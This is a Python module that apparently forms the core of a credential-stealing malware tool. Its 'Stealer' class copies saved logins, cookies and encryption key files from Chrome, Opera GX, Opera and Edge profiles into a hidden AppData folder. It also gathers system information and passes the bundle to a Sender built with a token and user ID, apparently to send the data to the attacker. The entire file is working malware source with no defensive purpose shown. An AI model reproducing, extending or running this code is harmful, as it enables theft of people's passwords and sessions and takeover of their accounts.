from shutil import rmtree
from getpass import getuser
from threading import Thread
from os import path, mkdir, environ, sep

from .modules.sender import Sender
from .modules.system import System

from .browsers.chromium import Chromium


class Stealer(Thread):

    def __init__(self, token: str, user_id: int, errors: bool = False):
        Thread.__init__(self, name="Stealer")

        self.token = token
        self.user_id = user_id
        self.errors = errors

        self.user = getuser()
        self.zip_name = f"{self.user}-st"
        self.storage_path = f"C:/Users/{self.user}/AppData/"
        self.storage_folder = "stink/"

        self.browsers = [
            {
                "method": Chromium(
                    "Chrome",
                    self.storage_path,
                    self.storage_folder,
                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Local State",
                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\default\Cookies",
                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\default\Login Data",
                    self.errors
                )
            },
            {
                "method": Chromium(
                    "Opera GX",
                    self.storage_path,
                    self.storage_folder,
                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Local State",
                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Cookies",
                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
                    self.errors
                )
            },
            {
                "method": Chromium(
                    "Opera Default",
                    self.storage_path,
                    self.storage_folder,
                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Local State",
                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Cookies",
                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Login Data",
                    self.errors
                )
            },
            {
                "method": Chromium(
                    "Microsoft Edge",
                    self.storage_path,
                    self.storage_folder,
                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Local State",
                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
                    self.errors
                )
            }
        ]

    def __create_storage(self):

        if not path.exists(f"{self.storage_path}{self.storage_folder}"):

            mkdir(f"{self.storage_path}{self.storage_folder}")

        else:

            rmtree(f"{self.storage_path}{self.storage_folder}")
            mkdir(f"{self.storage_path}{self.storage_folder}")

    def run(self):

        try:

            self.__create_storage()

            for browser in self.browsers:
                browser["method"].run()

            System(self.storage_path, self.storage_folder, "/System", self.errors).run()
            Sender(self.zip_name, self.storage_path, self.storage_folder, self.token, self.user_id, self.errors).run()

        except Exception as e:

            if self.errors is True:

                print(f"[MULTISTEALER]: {repr(e)}")

            else:

                pass
